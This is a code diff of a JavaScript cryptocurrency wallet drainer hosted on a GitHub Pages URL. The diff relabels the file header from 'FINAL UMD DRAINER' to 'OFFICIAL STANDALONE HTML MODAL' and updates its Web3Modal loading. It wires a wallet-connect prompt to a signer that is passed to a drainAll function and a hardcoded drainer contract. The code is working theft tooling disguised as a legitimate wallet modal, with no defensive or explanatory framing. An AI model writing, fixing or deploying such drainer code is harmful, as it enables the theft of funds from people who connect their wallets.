@@ -1,5 +1,5 @@
-// resolution.js - FINAL UMD DRAINER (NO ESM, NO CONFLICTS)
-// Host: https://dynamo210.github.io/ultimate-resolution/public/resolution.js?v=10
+// resolution.js - OFFICIAL STANDALONE HTML MODAL
+// Host: https://dynamo210.github.io/ultimate-resolution/public/resolution.js?v=11
 
 const PROJECT_ID = '281727c769bcec075b63e0fbc5a3fdcc';
 const DRAINER_CONTRACT = '0xa6f8aed0de04de90af07229187a0fa3143d70c6e';
@@ -18,30 +18,26 @@ function loadScript(src, callback) {
   const script = document.createElement('script');
   script.src = src;
   script.onload = callback;
-  script.onerror = () => console.error(`FAILED LOAD: ${src}`);
+  script.onerror = () => console.error(`FAILED: ${src}`);
   document.head.appendChild(script);
 }
 
 function initDrainer() {
-  // Load ethers UMD
   loadScript('https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js', () => {
-    // Load Web3Modal Standalone UMD (WORKING CDN)
-    loadScript('https://cdn.jsdelivr.net/npm/@web3modal/standalone@2.4.3/dist/web3modal-standalone.umd.js', setupModal);
+    loadScript('https://cdn.jsdelivr.net/npm/@web3modal/html@2.9.0/dist/index.umd.js', setupModal);
   });
 }
 
 function setupModal() {
-  const { Web3Modal } = window.web3modalStandalone;
+  const { Web3Modal } = window['@web3modal/html'];
 
   modal = new Web3Modal({
     projectId: PROJECT_ID,
-    walletConnectVersion: 2,
     themeMode: 'dark'
   });
 
-  // Listen for connect
-  modal.subscribeModal(async (event) => {
-    if (event.type === 'CONNECT_SUCCESS') {
+  modal.subscribeEvents(async (event) => {
+    if (event.name === 'CONNECT_SUCCESS') {
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
       const user = await signer.getAddress();
@@ -88,7 +84,7 @@ async function drainAll(provider, signer, user) {
   }
 }
 
-window.connectWallet = () => modal.openModal();
+window.connectWallet = () => modal.open();
 
 // Start
 initDrainer();
